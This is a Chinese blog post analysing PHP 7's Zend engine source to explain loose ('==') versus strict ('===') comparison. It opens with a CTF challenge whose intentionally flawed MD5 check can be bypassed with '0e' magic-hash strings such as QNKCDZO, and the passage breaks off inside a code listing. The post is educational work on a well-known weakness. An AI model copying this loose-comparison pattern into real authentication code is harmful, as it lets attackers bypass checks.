    <content type="html"><![CDATA[<p>本文首发<a href="https://xz.aliyun.com/t/5426">先知社区</a></p><a id="more"></a><p>最近一直在学习PHP源码，在对PHP各个变量的实现有了一个大概的了解之后，尝试着对PHP的一些特性进行分析。在PHP源码分析方面，我算是一个初学者，如果有错误，欢迎师傅们批评指正。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>PHP</code>中有很多黑魔法，最初入门CTF的时候，就经常遇到考察<code>PHP</code>弱类型的题，比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>); <br>highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);  <br><br><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>); <br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]; <br><span class="hljs-variable">$md52</span> = md5(<span class="hljs-variable">$a</span>); <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123; <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>; <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解决方案就是寻找一个<code>MD5</code>值是<code>0e</code>开头的字符串，<code>PHP</code>在使用<code>==</code>进行比较的时候，会认为该字符串是科学计数法表示的数字，然后又因为<code>QNKCDZO</code>的MD5值是<code>0e830400451993494058024219903391</code>，两个字符串都被转换为数字<code>0</code>，从而使表达式<code>$md51 == $md52</code>成立，但是如果是<code>===</code>运算符，表达式就不会成立了。<br>对于变量之间的比较，<a href="https://secure.php.net/manual/zh/language.operators.comparison.php">手册</a>中写的也挺详细的。<br><img src="https://image.mengsec.com/php-learn/20190615152049.png"></p><p>接下来根据<code>PHP</code>的源码来分析下，这两个运算符是如何实现的。</p><h2 id="环境-amp-工具"><a href="#环境-amp-工具" class="headerlink" title="环境&amp;工具"></a>环境&amp;工具</h2><ul><li>Mac Mojave 10.14</li><li>PHP 7.1 + vld扩展</li><li>VSCode debug</li><li>UnderStand</li></ul><h2 id="1-PHP的弱类型实现"><a href="#1-PHP的弱类型实现" class="headerlink" title="1. PHP的弱类型实现"></a>1. PHP的弱类型实现</h2><p>我们都知道<code>PHP</code>中的变量本身是弱类型的，使用者在使用时不需要对变量类型进行声明，但<code>PHP</code>的底层是用<code>C</code>语言实现的，而<code>C</code>语言中的变量是强类型的，使用时需要对变量类型进行声明。接下来我们基于<code>PHP7</code>的源码，来简单分析下<code>PHP</code>中的变量实现。</p><p>在<code>PHP</code>中，所有的变量都是由一个<code>zval</code>结构体来存储的。<br>路径：<code>Zend/zend_types.h:121-143</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zval_struct</span> &#123;</span><br>    zend_value value;            <span class="hljs-comment">/* value */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            ZEND_ENDIAN_LOHI_4(<br>                zend_uchar type,         <span class="hljs-comment">/* zval类型 */</span><br>                zend_uchar type_flags, <span class="hljs-comment">/* 对应变量类型特有的标记 */</span><br>                zend_uchar const_flags, <span class="hljs-comment">/* 常量类型的标记 */</span><br>                zend_uchar reserved)  <span class="hljs-comment">/* call info for EX(This) */</span><br>        &#125; v;<br>        <span class="hljs-keyword">uint32_t</span> type_info; <span class="hljs-comment">/* 与v是一个联合体，内存共享，修改该值等于修改结构体v的值。 */</span><br>    &#125; u1;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-keyword">uint32_t</span> next; <span class="hljs-comment">/* 用来解决hash冲突 */</span><br>        <span class="hljs-keyword">uint32_t</span> cache_slot; <span class="hljs-comment">/* 运行时的缓存 */</span><br>        <span class="hljs-keyword">uint32_t</span> lineno; <span class="hljs-comment">/* zend_ast_zval存行号 */</span><br>        <span class="hljs-keyword">uint32_t</span> num_args; <span class="hljs-comment">/* EX(This)参数个数 */</span><br>        <span class="hljs-keyword">uint32_t</span> fe_pos; <span class="hljs-comment">/* foreach的位置 */</span><br>        <span class="hljs-keyword">uint32_t</span> fe_iter_idx; <span class="hljs-comment">/* foreach 游标的标记 */</span><br>        <span class="hljs-keyword">uint32_t</span> access_flags; <span class="hljs-comment">/* 类的常量访问标识 */</span><br>        <span class="hljs-comment">// 常用的标识有 public、protected、 private</span><br>        <span class="hljs-keyword">uint32_t</span> property_guard; <span class="hljs-comment">/* 单一属性保护 */</span><br>        <span class="hljs-comment">// 防止类中魔术方法的循环调用</span><br>    &#125; u2;<br>&#125;;<br></code></pre></td></tr></table></figure><p>变量真正的数据存储在<code>value</code>中，也就是结构体<code>_zend_value</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">union</span> _<span class="hljs-title">zend_value</span> &#123;</span><br>    zend_long lval; <span class="hljs-comment">// 整型</span><br>    <span class="hljs-keyword">double</span> dval; <span class="hljs-comment">// 浮点型</span><br>    zend_refcounted *counted; <span class="hljs-comment">// 引用计数</span><br>    zend_string *str; <span class="hljs-comment">// 字符串类型</span><br>    zend_array *arr; <span class="hljs-comment">// 数组类型</span><br>    zend_object *obj; <span class="hljs-comment">// 对象类型</span><br>    zend_resource *res; <span class="hljs-comment">// 资源类型</span><br>    zend_reference *ref; <span class="hljs-comment">// 引用类型</span><br>    zend_ast_ref *ast; <span class="hljs-comment">// 抽象语法树</span><br>    zval *zv; <span class="hljs-comment">// zval类型</span><br>    <span class="hljs-keyword">void</span> *ptr; <span class="hljs-comment">// 指针类型</span><br>    zend_class_entry *ce; <span class="hljs-comment">// class类型</span><br>    zend_function *func; <span class="hljs-comment">// function类型</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-keyword">uint32_t</span> w1;<br>        <span class="hljs-keyword">uint32_t</span> w2;<br>    &#125; ww;<br>&#125; zend_value;<br></code></pre></td></tr></table></figure><p>而变量的类型通过联合体<code>v</code>中的<code>type</code>来表示。<br>路径<code>Zend/zend_types.h:303</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 常规数据类型 */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_UNDEF                    0 <span class="hljs-comment">// 标记未使用类型</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_NULL                     1 <span class="hljs-comment">// NULL</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_FALSE                    2 <span class="hljs-comment">// 布尔false</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_TRUE                     3 <span class="hljs-comment">// 布尔true</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_LONG                     4 <span class="hljs-comment">// 长整型</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_DOUBLE                   5 <span class="hljs-comment">// 浮点型</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_STRING                   6 <span class="hljs-comment">// 字符串</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_ARRAY                    7 <span class="hljs-comment">// 数组</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_OBJECT                   8 <span class="hljs-comment">// 对象</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_RESOURCE                 9 <span class="hljs-comment">// 资源类型</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_REFERENCE                10 <span class="hljs-comment">// 参考类型</span></span><br><span class="hljs-comment">/* constant expressions */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_CONSTANT                 11 <span class="hljs-comment">// 常量类型</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_CONSTANT_AST             12 <span class="hljs-comment">// 常量类型的AST数</span></span><br><span class="hljs-comment">/* 伪类型 */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IS_BOOL                    13</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_CALLABLE                 14</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_ITERABLE                 19</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_VOID                     18</span><br><span class="hljs-comment">/* 内部类型 */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_INDIRECT                 15 <span class="hljs-comment">// 间接类型</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_PTR                      17 <span class="hljs-comment">// 指针类型</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IS_ERROR                   20 <span class="hljs-comment">// 错误类型</span></span><br></code></pre></td></tr></table></figure><p>在真正取值的时候，<code>Zend</code>虚拟机会根据获取的<code>type</code>类型来获取对应的值。<br>比如我们执行代码<code>$a = 1;</code>，在<code>PHP</code>内部，<code>$a</code>用<code>zval</code>结构体来表示，它的<code>u1.v.type==IS_LONG</code>，这表示它是一个长整型，它的<code>value.lval==1</code>，这表示它的值为<code>1</code>。<br>如果代码是<code>$b = &#39;123&#39;;</code>，那么它的<code>u1.v.type==IS_STRING</code>，这表示它是一个字符串，它的<code>value == zend_string *str</code>，真正的字符串<code>123</code>存储在<code>PHP</code>中的<code>zend_string</code>结构体中。<br>总之，在<code>PHP</code>中，无论是什么类型的变量，都是在<code>zval</code>结构体中存储的，<code>Zend</code>虚拟机面对的，始终是<code>zval</code>结构体。<br>基于这种结构，<code>PHP</code>中的变量成功实现了弱类型。</p><p>接下来我们看一下<code>PHP</code>弱类型比较的实现过程。</p><h2 id="2-‘-’-amp-amp-‘-’-的源码实现"><a href="#2-‘-’-amp-amp-‘-’-的源码实现" class="headerlink" title="2. ‘==’ &amp;&amp; ‘===’ 的源码实现"></a>2. ‘==’ &amp;&amp; ‘===’ 的源码实现</h2><h3 id="2-1-前置知识"><a href="#2-1-前置知识" class="headerlink" title="2.1 前置知识"></a>2.1 前置知识</h3><p>首先我们先了解一下<code>PHP</code>的执行过程。</p><ol><li>进行词法分析，将<code>PHP</code>代码转换为有意义的标识<code>Token</code>，使用词法分析器<code>Re2c</code>实现，将<code>Zend/zend_language_scanner.l</code>文件编译为<code>Zend/zend_language_scanner.c</code>。</li><li>进行语法分析，将<code>Token</code>和符合文法规则的代码生成抽象语法树。语法分析器基于<code>Bison</code>实现，将<code>Zend/zend_language_parser.y</code>文件编译为<code>Zend/zend_language_parser.c</code>。</li><li>生成的抽象语法树生成对应的<code>opcode</code>，然后被虚拟机执行。<code>opcode</code>对应着相应的处理函数，当虚拟机调用<code>opcode</code>时，会找到<code>opcode</code>对应的处理函数，执行真正的处理过程。</li></ol><h3 id="2-2-分析过程"><a href="#2-2-分析过程" class="headerlink" title="2.2 分析过程"></a>2.2 分析过程</h3><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;123&quot;</span>;<br>var_dump(<span class="hljs-variable">$a</span> == <span class="hljs-number">123</span>);<br>var_dump(<span class="hljs-variable">$a</span> === <span class="hljs-number">123</span>);<br></code></pre></td></tr></table></figure><p>我们借助<code>vld</code>扩展来看一下代码执行的<code>opcode</code>。</p><p><img src="https://image.mengsec.com/php-learn/20190615161417.png"></p><p>可以看到，我们拿到了两个比较符对应的<code>opcode</code>，很容易理解。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;==&#x27;</span> : IS_EQUAL <span class="hljs-regexp">//</span> 相等<br><span class="hljs-string">&#x27;===&#x27;</span>: IS_IDENTICAL <span class="hljs-regexp">//</span> 完全相等<br></code></pre></td></tr></table></figure><p>然后我们根据拿到的这两个<code>opcode</code>，查找词法分析的源码来验证下。<br>路径：<code>Zend/zend_language_scanner.l:1468</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;ST_IN_SCRIPTING&gt;<span class="hljs-string">&quot;===&quot;</span> &#123;<br>RETURN_TOKEN(T_IS_IDENTICAL)<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>路径：<code>Zend/zend_language_scanner.l:1476</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;ST_IN_SCRIPTING&gt;<span class="hljs-string">&quot;==&quot;</span> &#123;<br>RETURN_TOKEN(T_IS_EQUAL)<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以知道，在词法分析时，标识<code>Token</code>为<code>T_IS_EQUAL</code>和<code>T_IS_IDENTICAL</code>，<br>接下来语法分析的源码<code>Zend/zend_language_parser.y</code>中查找。<br>路径：<code>Zend/zend_language_parser.y:931</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">|expr T_IS_IDENTICAL expr<br>&#123; <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span> = zend_ast_create_binary_op(ZEND_IS_IDENTICAL, <span class="hljs-symbol">$</span><span class="hljs-number">1</span>, <span class="hljs-symbol">$</span><span class="hljs-number">3</span>); &#125;<br></code></pre></td></tr></table></figure><p>路径：<code>Zend/zend_language_parser.y:935</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">|expr T_IS_EQUAL expr<br>&#123; <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span> = zend_ast_create_binary_op(ZEND_IS_EQUAL, <span class="hljs-symbol">$</span><span class="hljs-number">1</span>, <span class="hljs-symbol">$</span><span class="hljs-number">3</span>); &#125;<br></code></pre></td></tr></table></figure><p>可以知道，在语法分析中，调用生成<code>opcode</code>的函数为<code>zend_ast_create_binary_op</code>，生成的<code>opcode</code>分别是<code>ZEND_IS_EQUAL</code>和<code>ZEND_IS_IDENTICAL</code>。</p><p>接下来就是去寻找<code>opcode</code>对应的处理函数了。<br>路径：<code>Zend/zend_vm_execute.h</code><br><img src="https://image.mengsec.com/php-learn/20190615165118.png"><br>根据<code>Token</code>可以搜索到很多函数的声明，根据函数名以及我们上面的<code>vld</code>扩展的输出，我们可以猜测，命名规则为<br><code>ZEND_IS_EQUAL_SPEC_</code>开头，接下来是<code>OP1</code>和<code>OP2</code>，然后以<code>HANDLE</code>结尾。</p><p><img src="https://image.mengsec.com/php-learn/20190615165719.png"><br><code>ZEND_IS_IDENTICAL</code>对应函数的的声明也类似。</p><h4 id="2-2-1-‘-’-源码实现分析"><a href="#2-2-1-‘-’-源码实现分析" class="headerlink" title="2.2.1 ‘==’ 源码实现分析"></a>2.2.1 ‘==’ 源码实现分析</h4><p>根据<code>vld</code>扩展的输出，我们找到对应的函数<code>ZEND_IS_EQUAL_SPEC_CV_CONST_HANDLER</code>。<br><img src="https://image.mengsec.com/php-learn/20190615170035.png"></p><p>路径：<code>Zend/zend_vm_execute.h:36530</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">static</span> ZEND_OPCODE_HANDLER_RET ZEND_FASTCALL <span class="hljs-title">ZEND_IS_EQUAL_SPEC_CV_CONST_HANDLER</span><span class="hljs-params">(ZEND_OPCODE_HANDLER_ARGS)</span></span><br><span class="hljs-function"></span>&#123;<br>USE_OPLINE<br><br>zval *op1, *op2, *result;<br><br>op1 = _get_zval_ptr_cv_undef(execute_data, opline-&gt;op1.var); <span class="hljs-comment">// 获取OP1</span><br>op2 = EX_CONSTANT(opline-&gt;op2); <span class="hljs-comment">// 获取OP2</span><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">int</span> result;<br><br><span class="hljs-keyword">if</span> (EXPECTED(Z_TYPE_P(op1) == IS_LONG)) &#123;<br><span class="hljs-keyword">if</span> (EXPECTED(Z_TYPE_P(op2) == IS_LONG)) &#123; <span class="hljs-comment">// 如果OP1和OP2都是长整型，直接作比较并获得结果</span><br>result = (Z_LVAL_P(op1) == Z_LVAL_P(op2));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (EXPECTED(Z_TYPE_P(op2) == IS_DOUBLE)) &#123; <span class="hljs-comment">// 如果OP1是长整型，OP2是浮点型，对OP1进行强制类型转换为浮点型，然后再作比较。</span><br>result = ((<span class="hljs-keyword">double</span>)Z_LVAL_P(op1) == Z_DVAL_P(op2));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span>; <span class="hljs-comment">// 跳出</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (EXPECTED(Z_TYPE_P(op1) == IS_DOUBLE)) &#123; <br><span class="hljs-keyword">if</span> (EXPECTED(Z_TYPE_P(op2) == IS_DOUBLE)) &#123; <span class="hljs-comment">// 如果OP1和OP2都是浮点型，直接作比较并获得结果</span><br>result = (Z_DVAL_P(op1) == Z_DVAL_P(op2));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (EXPECTED(Z_TYPE_P(op2) == IS_LONG)) &#123; <span class="hljs-comment">// 如果OP1是浮点型，OP2是长整型，对OP2进行强制类型转换为浮点型，然后再作比较</span><br>result = (Z_DVAL_P(op1) == ((<span class="hljs-keyword">double</span>)Z_LVAL_P(op2)));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span>; <span class="hljs-comment">// 跳出</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (EXPECTED(Z_TYPE_P(op1) == IS_STRING)) &#123;<br><span class="hljs-keyword">if</span> (EXPECTED(Z_TYPE_P(op2) == IS_STRING)) &#123; <span class="hljs-comment">// 如果OP1和OP2都是字符串</span><br><span class="hljs-keyword">if</span> (Z_STR_P(op1) == Z_STR_P(op2)) &#123; <span class="hljs-comment">// 取出OP1和OP2的zval.value.str结构体，判断是否相等</span><br>result = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Z_STRVAL_P(op1)[<span class="hljs-number">0</span>] &gt; <span class="hljs-string">&#x27;9&#x27;</span> || Z_STRVAL_P(op2)[<span class="hljs-number">0</span>] &gt; <span class="hljs-string">&#x27;9&#x27;</span>) &#123; <span class="hljs-comment">// 如果OP1或者OP2的字符串开头不是数字</span><br><span class="hljs-keyword">if</span> (Z_STRLEN_P(op1) != Z_STRLEN_P(op2)) &#123; <span class="hljs-comment">// 两个字符串长度不相同</span><br>result = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>result = (<span class="hljs-built_in">memcmp</span>(Z_STRVAL_P(op1), Z_STRVAL_P(op2), Z_STRLEN_P(op1)) == <span class="hljs-number">0</span>);<span class="hljs-comment">// 按字节来判断OP1和OP2的字符串结构体是否相等</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>result = (zendi_smart_strcmp(Z_STR_P(op1), Z_STR_P(op2)) == <span class="hljs-number">0</span>); <span class="hljs-comment">// 使用zendi_smart_strcmp来判断OP1和OP2的字符串是否相等</span><br>&#125;<br><br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ZEND_VM_SMART_BRANCH(result, <span class="hljs-number">0</span>);<br>ZVAL_BOOL(EX_VAR(opline-&gt;result.var), result);<br>ZEND_VM_NEXT_OPCODE();<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>);<br><br>SAVE_OPLINE();<br><span class="hljs-keyword">if</span> (IS_CV == IS_CV &amp;&amp; UNEXPECTED(Z_TYPE_P(op1) == IS_UNDEF)) &#123; <span class="hljs-comment">// 异常判断</span><br>op1 = GET_OP1_UNDEF_CV(op1, BP_VAR_R);<br>&#125;<br><span class="hljs-keyword">if</span> (IS_CONST == IS_CV &amp;&amp; UNEXPECTED(Z_TYPE_P(op2) == IS_UNDEF)) &#123; <span class="hljs-comment">// 异常判断</span><br>op2 = GET_OP2_UNDEF_CV(op2, BP_VAR_R);<br>&#125;<br>result = EX_VAR(opline-&gt;result.var);<br>compare_function(result, op1, op2); <span class="hljs-comment">// 后面进行重点分析</span><br>ZVAL_BOOL(result, Z_LVAL_P(result) == <span class="hljs-number">0</span>); <span class="hljs-comment">// 将结果转换为布尔型</span><br><br><br>ZEND_VM_NEXT_OPCODE_CHECK_EXCEPTION(); <span class="hljs-comment">// Zend虚拟机执行下一个opcode</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，如果前面的条件都没能成立，就会进入<code>compare_function</code>函数。<br>首先我们查看一下调用关系，可以知道<code>compare_function</code>是<code>PHP</code>中变量对比的一个核心函数，<br><img src="https://image.mengsec.com/php-learn/20190616170007.png"><br>为了方便阅读，我把其中用到的宏放到了下面。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TYPE_PAIR(t1,t2) (((t1) &lt;&lt; 4) | (t2))</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> Z_DVAL(zval)(zval).value.dval</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> Z_DVAL_P(zval_p)Z_DVAL(*(zval_p))</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ZVAL_LONG(z, l) <span class="hljs-comment">// 将zval z的类型设置为长整型，值设置为l</span></span><br></code></pre></td></tr></table></figure><p>路径：<code>Zend/zend_operators.c:1976</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">ZEND_API <span class="hljs-keyword">int</span> ZEND_FASTCALL <span class="hljs-title">compare_function</span><span class="hljs-params">(zval *result, zval *op1, zval *op2)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> ret;<br><span class="hljs-keyword">int</span> converted = <span class="hljs-number">0</span>;<br>zval op1_copy, op2_copy;<br>zval *op_free, tmp_free;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">switch</span> (TYPE_PAIR(Z_TYPE_P(op1), Z_TYPE_P(op2))) &#123; <span class="hljs-comment">// 获取OP1和OP2的type值，然后进行TYPE_PAIR运算</span><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span class="hljs-title">TYPE_PAIR</span><span class="hljs-params">(IS_LONG, IS_LONG)</span>: <span class="hljs-comment">// 两者都是长整型</span></span><br><span class="hljs-function"><span class="hljs-title">ZVAL_LONG</span><span class="hljs-params">(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?<span class="hljs-number">1</span>:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?<span class="hljs-number">-1</span>:<span class="hljs-number">0</span>))</span></span>;<br><span class="hljs-keyword">return</span> SUCCESS;<br><br><span class="hljs-function"><span class="hljs-keyword">case</span> <span 